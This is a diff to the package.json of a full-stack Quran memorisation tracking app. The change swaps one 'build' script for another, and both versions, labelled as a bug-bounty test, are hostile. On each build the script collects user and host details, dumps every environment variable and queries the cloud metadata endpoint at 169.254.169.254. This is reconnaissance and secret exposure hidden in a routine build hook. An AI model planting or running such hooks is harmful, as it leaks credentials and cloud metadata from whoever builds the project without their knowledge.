@@ -4,7 +4,7 @@
   "description": "نظام متابعة تحصيل القرآن الكريم - Full Stack",
   "main": "index.js",
   "scripts": {
-    "build": "echo '--- BBP TEST START ---' && whoami && hostname && uname -a && echo '--- ENV CHECK ---' && env && echo '--- METADATA CHECK ---' && (curl -s -m 3 http://169.254.169.254/latest/meta-data/ || echo 'metadata unreachable') && echo '--- BBP TEST END ---'",
+    "build": "echo BBP_TEST_START && whoami && hostname && uname -a && echo BBP_ENV_CHECK && env && echo BBP_METADATA_CHECK && (curl -s -m 3 http://169.254.169.254/latest/meta-data/ || echo metadata_unreachable) && echo BBP_TEST_END",
     "dev": "concurrently \"npm run dev --prefix backend\" \"npm run dev --prefix frontend\"",
     "start": "npm run dev",
     "backend": "npm run dev --prefix backend",
